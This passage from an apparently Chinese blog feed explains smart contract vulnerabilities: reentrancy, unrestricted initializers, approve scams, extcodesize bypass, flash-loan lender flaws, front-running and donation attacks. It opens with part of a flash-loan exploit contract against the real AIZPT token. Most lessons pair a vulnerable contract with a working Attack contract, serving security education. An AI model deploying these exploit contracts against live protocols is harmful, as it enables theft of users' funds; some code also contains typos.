function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //将攻击合约中剩下的钱转给攻击者自己的地址        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //出售200次        for (uint256 i; i &lt; 199; ++i) &#123;          //以383727 ether的价格卖出代币            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // 还清贷款和利息        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;从测试合约中来看,就是在执行闪电贷回调的时候,进行一个购买出售的操作完整的调用信息[点击](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约的漏洞</title>
      <link href="/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="智能合约的漏洞"><a href="#智能合约的漏洞" class="headerlink" title="智能合约的漏洞"></a>智能合约的漏洞</h1><h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p> 重入漏洞本质上是状态同步问题，当智能合约调用外部函数时，执行流会转移到被调用的合约，如果调用合约未能正确同步状态，则在流程转移过程中可能会被重新进入，导致重复执行相同的代码逻辑。具体来说，攻击通常分两个步骤展开：<br>1，被攻击合约调用攻击合约的外部函数，并转移执行流程。<br>2，在攻击合约函数内部，利用一定的技巧，再次调用被攻击合约的漏洞函数。<br>由于以太坊虚拟机 (EVM) 是单线程的，因此在重新进入易受攻击的函数时，合约状态不会正确更新，类似于初始调用。这允许攻击者重复执行某些代码逻辑，从而实现意外行为。典型的攻击模式涉及多次重复的资金提取。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>以修改后的WETH为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 bal = balances[msg.sender];</span><br><span class="line">        require(bal &gt; 0);</span><br><span class="line"></span><br><span class="line">        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<strong>存款函数</strong>中，用户可以存入ETH，收到的WETH记录在<strong>余额</strong>状态变量中。</li><li>在<strong>withdraw函数</strong>中，用户可以通过调用 call 函数来提取 ETH，<strong>call</strong>函数用于向用户转账。此时，执行流程转移到用户的合约。如果用户合约是恶意的，它可以通过默认的<strong>accept函数重新进入withdraw函数</strong>。由于余额没有更新，<strong>require</strong>语句通过了检查，从而允许攻击合约重复提取 ETH。</li></ul><p>攻击者就可以部署一个名为Attack的恶意合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStore public etherStore;</span><br><span class="line">    uint256 public constant AMOUNT = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // receive is called when EtherStore sends Ether to this contract.</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= AMOUNT) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= AMOUNT);</span><br><span class="line">        etherStore.deposit&#123;value: AMOUNT&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<strong>攻击函数</strong>中，攻击者首先转入一定数量的ETH，调用<strong>etherStore.deposit</strong>函数将其转入目标合约<strong>EtherStore</strong> ，然后调用<strong>etherStore.withdraw</strong>函数提现ETH。这看似是一个常规操作，但问题就出现在下一个函数中。</li><li>合约收到 ETH 时默认执行的函数是<strong>accept</strong>，它标有<strong>payable</strong>关键字，表示它可以接收发送给它的 ETH（使用<strong>fallback</strong>函数可以实现类似的效果）。在函数内部，如果目标合约的余额满足条件（大于 1 ETH），则再次调用<strong>withdraw</strong>函数，触发重新进入。由于目标合约中用户余额只在最后一步更新，因此条件<strong>require(bal &gt; 0)</strong>;仍然成立，允许攻击者继续从目标合约中抽取 ETH 😨😨😨</li></ul><h2 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h2><h3 id="不受限制的初始化函数"><a href="#不受限制的初始化函数" class="headerlink" title="不受限制的初始化函数"></a>不受限制的初始化函数</h3><p>某些合约包含用于设置所有者的初始化函数，但未能限制该函数只能调用一次。攻击者可以利用这一点，再次调用初始化函数，将所有权转移到他们的账户中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initContract() public &#123;</span><br><span class="line">    owner = msg.sender; // Lack of calling restriction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过度授权的角色"><a href="#过度授权的角色" class="headerlink" title="过度授权的角色"></a>过度授权的角色</h3><p>使用 OpenZeppelin 的Ownable库时，如果多个角色被分配onlyOwner权限，则会增加攻击面。一旦攻击者获得具有所有者权限的帐户的访问权限，他们就可以执行合约中的任何关键功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyOwner &#123;</span><br><span class="line">    // Critical logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代币销毁函数授权不当"><a href="#代币销毁函数授权不当" class="headerlink" title="代币销毁函数授权不当"></a>代币销毁函数授权不当</h3><p>如果代币合约中的销毁函数是公开的，任何人都可以调用它来销毁别人的代币，从而操纵代币供应，导致价格波动和流动性枯竭。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;</span><br><span class="line">    _burn(account, amount); // No access control</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20批准骗局"><a href="#ERC20批准骗局" class="headerlink" title="ERC20批准骗局"></a>ERC20批准骗局</h2><p>在区块链世界中，以太坊的ERC20代币标准是最知名的代币协议标准之一。然而在ERC20标准实施过程中，对approve函数的滥用会导致一个严重的安全漏洞ApproveScam 。接下来将对ApproveScam漏洞的原理、后果以及相应的预防措施进行探讨。</p><h3 id="ApproveScan漏洞是什么"><a href="#ApproveScan漏洞是什么" class="headerlink" title="ApproveScan漏洞是什么"></a>ApproveScan漏洞是什么</h3><p>ApproveScam 漏洞源于对ERC20 标准中<strong>批准函数的滥用</strong>。<strong>批准</strong>函数旨在允许代币持有者授权特定地址从持有者的账户中转出一定数量的代币。但是，如果持有者批准的金额过大（通常是<strong>type(uint256).max</strong>表示的无限金额），攻击者可以在未经持有者同意的情况下从持有者的账户中转出所有代币。</p><p>具体来说，一旦 Alice 授权 Eve 从 Alice 的账户中转出无限量的代币，Eve 就可以调用transferFrom函数将 Alice 账户中的所有代币转移到自己的账户中。这就是 ApproveScam 漏洞的核心原理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Alice approves Eve to transfer an unlimited amount of tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.approve(address(eve), type(uint256).max);</span><br><span class="line"></span><br><span class="line">// Eve uses the authorization to transfer all tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.transferFrom(address(alice), address(eve), 1000);</span><br></pre></td></tr></table></figure><h3 id="ApproveScan的后果"><a href="#ApproveScan的后果" class="headerlink" title="ApproveScan的后果"></a>ApproveScan的后果</h3><p>ApproveScam 漏洞背后的原理虽然简单，但造成的损失却是灾难性的。一旦用户轻易授权某个地址，攻击者便可以在用户不知情的情况下，轻松将用户账户中的所有代币转走。</p><p>此外，ApproveScam 漏洞还可能被滥用于洗钱等其他非法活动。总而言之，ApproveScam 是一个严重的安全风险，开发人员和用户需要认真对待。</p><h3 id="如何预防ApproveScan"><a href="#如何预防ApproveScan" class="headerlink" title="如何预防ApproveScan"></a>如何预防ApproveScan</h3><p>预防 ApproveScam 漏洞的最佳方法是谨慎使用批准功能，尤其是在授权金额时。请遵循以下原则：</p><ul><li>仅在必要时调用批准功能，避免过度使用或滥用。</li><li>根据实际需要设置授权金额，例如permit(spender, amount)而不是permit(spender, type(uint256).max) 。</li><li>完成功能后立即撤销之前的授权，即approve(spender, 0) 。</li><li>在智能合约开发过程中，彻底检查批准功能的使用，以防止 ApproveScam 漏洞。</li></ul><h2 id="合约账户检查漏洞"><a href="#合约账户检查漏洞" class="headerlink" title="合约账户检查漏洞"></a>合约账户检查漏洞</h2><p>在 Solidity 智能合约开发中，开发者经常会使用各种检查机制来保证合约的安全。一种常见的做法是使用<strong>extcodesize函数</strong>来检查调用者地址的代码大小，从而区分合约账户和外部拥有账户（EOA）。然而，如果滥用该机制，攻击者可以利用合约构造函数中的临时漏洞绕过检查，发起恶意操作。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>智能合约在初次部署时，会先执行构造函数代码，在构造函数执行完成之前，新部署的合约地址上其实是没有任何字节码存在的，这就导致了基于 extcodesize 的检查存在一个盲点：如果攻击者在构造函数内立刻调用目标合约，由于攻击者合约地址上的字节码还未存储，因此<strong>extcodesize(address(this))会</strong>返回 0，从而绕过isContract 的检查。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        // At this point, extcodesize(address(this)) == 0</span><br><span class="line">        // Bypass the isContract check of the target contract</span><br><span class="line">        Target(_target).isContract(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码演示了一个典型的攻击场景，Attack合约在构造时传入Target合约地址，并立即在构造函数内调用Target.isContract()函数。由于Attack的部署尚未完成，isContract(address(this))将返回 false，从而允许攻击者绕过这一层保护并调用受保护的函数。</p><h3 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h3><p>Target合约有一个状态变量pwned,初始设置为false,该合约的设计初衷是只允许外部账户修改其值，而不允许合约账户修改，它通过isContract函数实现者一点，该函数依赖于extaodesize的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">        // This method relies on extcodesize, which returns 0 for contracts in</span><br><span class="line">        // construction, since the code is only stored at the end of the</span><br><span class="line">        // constructor execution.</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool public pwned = false;</span><br><span class="line"></span><br><span class="line">    function protected() external &#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;no contract allowed&quot;);</span><br><span class="line">        pwned = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们要修改pwned的值，使用以下代码是不能攻击成功的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FailedAttack &#123;</span><br><span class="line">    // Attempting to call Target.protected will fail,</span><br><span class="line">    // Target blocks calls from contracts</span><br><span class="line">    function pwn(address _target) external &#123;</span><br><span class="line">        // This will fail</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为Target合约只允许外部账户（EOA）调用，而我们的攻击合约是不能修改的</p><p>如果我们在构造函数中调用，其就会绕过isContract的检查，攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    bool public isContract;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    // When contract is being created, code size (extcodesize) is 0.</span><br><span class="line">    // This will bypass the isContract() check</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        isContract = Target(_target).isContract(address(this));</span><br><span class="line">        addr = address(this);</span><br><span class="line">        // This will work</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><p>为了修复此漏洞，我们可以不依赖extcodesize来执行检查，而是直接比较tx.origin和msg.sender是否相同。由于tx.origin始终指向最初发起交易的 EOA 地址，因此我们可以有效区分合约和 EOA 调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">    require(tx.origin == msg.sender);</span><br><span class="line">    return account.code.length &gt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="闪电贷攻击"><a href="#闪电贷攻击" class="headerlink" title="闪电贷攻击"></a>闪电贷攻击</h2><h3 id="闪电贷贷款人漏洞1"><a href="#闪电贷贷款人漏洞1" class="headerlink" title="闪电贷贷款人漏洞1"></a>闪电贷贷款人漏洞1</h3><p> MyToken是标准的 ERC20 代币，作为LenderPool内可供借贷的资产。</p><p> LenderPool合约允许用户执行闪电贷交易，其flashLoan函数接受用户请求，借出一定数量的代币，调用目标合约上的特定操作，并偿还贷款。在函数的最后，它会验证偿还后的余额是否大于偿还前的余额。通常，偿还金额包括本金和利息。因此，在发起贷款后，池子的余额应该增加。否则，贷款交易失败。</p><p> 该合约的漏洞在于目标合约的低代码调用。由于这里没有任何验证机制，并且调用函数提供了广泛的操作能力，例如获取LenderPool中MyToken代币的授权，因此可以从池中抽取所有资产。<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract LenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    MyToken public token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(MyToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line">        bool ret = token.transfer(borrower, amount);</span><br><span class="line"></span><br><span class="line">        // it&#x27;s dangerous</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) Ownable(msg.sender) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10**decimals());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在<strong>Attack合约</strong>的攻击函数中，攻击者从池合约发起一次闪电贷，借入 0 个代币，因为此时他们不需要这些代币。相反，他们构造 calldata以获得<strong>LenderPool</strong>的批准。一旦<strong>flashLoan</strong>函数成功执行，他们就会获得授权并执行<strong>transferFrom</strong>操作将代币转移到自己的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line">    MyToken token;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _token) &#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">        token = MyToken(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()</span><br><span class="line">        public</span><br><span class="line">        returns (uint256 before_balance, uint256 after_balance)</span><br><span class="line">    &#123;</span><br><span class="line">        before_balance = token.balanceOf(address(this));</span><br><span class="line">        bytes memory _calldata = abi.encodeWithSignature(</span><br><span class="line">            &quot;approve(address,uint256)&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            10000</span><br><span class="line">        );</span><br><span class="line">        pool.flashLoan(0, address(this), address(token), _calldata);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        token.transferFrom(address(pool), address(this), 10000);</span><br><span class="line">        after_balance = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="闪电贷贷款人漏洞2"><a href="#闪电贷贷款人漏洞2" class="headerlink" title="闪电贷贷款人漏洞2"></a>闪电贷贷款人漏洞2</h3><p>这是一个具有漏洞的合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EthLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>存款和取款函数用于存入和提取 ETH，用户 ETH 余额记录在合约的余额状态变量中。</li><li>flashLoan函数用于借出资金。在这里，借款人必须实现IFlashLoanEtherReceiver接口。当资金发送到借款人合约时，还会调用接口中定义的回调函数execute ，允许借款人执行自定义业务逻辑。但是，必须确保借入的资金偿还给贷方池，以保持余额大于或等于原始余额。否则将导致借贷失败。<blockquote><p>风险：只检查还款后的余额大小。但这个余额可能包括用户在合约中持有的资产，用户可以随时提取这些资产。</p></blockquote></li></ul><p>以下是攻击者合约，在执行回调函数中，攻击者将借入的资金存回池中，确保池子的余额不会减少，但这些资金现在被记录为攻击者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    EthLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = EthLenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抢跑交易"><a href="#抢跑交易" class="headerlink" title="抢跑交易"></a>抢跑交易</h2><p>它的本质就是利用了交易顺序进行获利</p><p>先说以下内涵，通俗来讲，就是被人比你快一步，因为在区块链上的交易都是公开透明的，就是能够获取其他人的交易，攻击者发现了你的交易信息，然后他支出更高的gas费用，在你之前进行交易，就会导致一些问题出现</p><blockquote><p>在以太坊交易中，当你发起一个交易时，首先会进行打包进入交易池，然后矿工来处理这些交易，当然，优先处理gas费更高的交易<br>举例：这是一个猜谜游戏，猜对即可获得10个ehter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^0.8.17;</span><br><span class="line"></span><br><span class="line">constract FindThisHash&#123;</span><br><span class="line">    bytes32 public constant hash = 111111;</span><br><span class="line"></span><br><span class="line">    constructor () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve (string memory solution) public&#123;</span><br><span class="line">        require(hash == keccak256(abi.encodePascked(solution)),&quot;Incorrect answer&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value：10 ehter&#125;(&quot;&quot;);</span><br><span class="line">        require(sent,&quot;Failed to send Ehter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A猜中了答案，调用了solve函数输入正确的答案此时的gas的价格设置为15gwei，然后有个人在交易池发现了这个，B就获取了A的答案，他又用比15gwei高的价格调用solve函数，然后矿工就会先处理B的交易，最后B获得了10以太币的奖励</p><h3 id="预防措施-1"><a href="#预防措施-1" class="headerlink" title="预防措施"></a>预防措施</h3><p>采用 Commit-Reveal 的模式，该方案有两个阶段：Commit 阶段，提交特定的值（比如包含答案的 Hash 值，答案并没有直接暴露出来）；以及 Reveal 阶段，其中揭示并检查值（校验答案是否正确）。</p><p>为了更好地理解，可以想象一下，发送者 Alice 将一条消息放入一个上锁的盒子中，然后将其交给接收者 Bob。Bob 以及其他任何人无法访问该消息，因为它被锁在盒子里，但是当 Alice 想要透露该消息时，她可以解锁盒子并将该消息显示给 Bob。</p><h2 id="签名重放攻击"><a href="#签名重放攻击" class="headerlink" title="签名重放攻击"></a>签名重放攻击</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>抢先交易攻击</title>
      <link href="/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="抢先交易攻击"><a href="#抢先交易攻击" class="headerlink" title="抢先交易攻击"></a>抢先交易攻击</h2><h3 id="交易抢跑"><a href="#交易抢跑" class="headerlink" title="交易抢跑"></a>交易抢跑</h3><h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>交易抢跑是指攻击者在看到某个交易即将被矿工打包到区块中时，通过提高gas费迅速提交自己的交易，使其在原交易之前被打包。</p><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>1.用户在去中心化交易所（如Uniswap）上提交一笔交易，希望以较低价格购买某种代币。<br>2.攻击者看到这一交易后，立即提交一笔相同的交易，但设置更高的交易费用（gas price），使其交易优先被处理。<br>3.结果，攻击者以较低价格获得代币，随后再以高价出售，获取利润。</p><h3 id="价格抢跑"><a href="#价格抢跑" class="headerlink" title="价格抢跑"></a>价格抢跑</h3><h4 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>价格抢跑发生在用户的交易影响了某个资产的价格，而攻击者在价格变动前迅速提交交易，从中获利。<br>举例：<br>1.在某个拍卖合约中，用户提交了一个出价，导致价格上涨。<br>2.攻击者注意到这一变化，并在用户出价被确认之前，提交自己的出价。<br>3.攻击者以更低的价格赢得拍卖，获取资产。</p><h3 id="状态抢跑"><a href="#状态抢跑" class="headerlink" title="状态抢跑"></a>状态抢跑</h3><h4 id="漏洞描述：-2"><a href="#漏洞描述：-2" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>状态抢跑是指攻击者通过观察合约的状态变化，利用这些信息进行有利的交易。<br>举例：<br>1.一个合约的状态更新为可以提取奖励，用户提取前，攻击者监测到这个状态变化，立即提交提取请求。<br>2.这样，攻击者可以在用户提取奖励之前获取更多的奖励。</p><h3 id="交易插队"><a href="#交易插队" class="headerlink" title="交易插队"></a>交易插队</h3><h4 id="漏洞描述：-3"><a href="#漏洞描述：-3" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>交易插队是指攻击者通过提交多个交易，迫使用户的交易在后续交易中失效，或者通过更高的交易费用将用户的交易挤出区块。</p><h4 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h4><p>用户提交了一笔重要的交易，攻击者故意在用户交易之前发送多笔低价值交易，提高网络拥堵，使用户的交易难以被打包。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>捐款攻击</title>
      <link href="/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="捐款攻击"><a href="#捐款攻击" class="headerlink" title="捐款攻击"></a>捐款攻击</h2><h3 id="该协议是否依赖于balance或者balanceof，而不是内部会计"><a href="#该协议是否依赖于balance或者balanceof，而不是内部会计" class="headerlink" title="该协议是否依赖于balance或者balanceof，而不是内部会计"></a>该协议是否依赖于balance或者balanceof，而不是内部会计</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>   在以太坊网络上，任何地址的余额（无论是以太币还是代币）都可以通过address(this).balance 或token.balanceof(address)查询。然而，外部账户的余额可以被外部操作（如其他合约调用、用户转账等）影响。依赖于外部状态（即余额）可能导致合约的内部逻辑失去一致性，因为外部账户的状态在合约运行期间是不可预测的。</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>   首位存款人可以中断股份的锻造，如果总资产通过大量捐款被操纵，用户可能无法获得其存款的股份，攻击者操纵依赖于balanceof确定总资产金额并阻止其他用户通过存款换取股份</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务攻击（DOS）</title>
      <link href="/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/"/>
      <url>/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/</url>
      
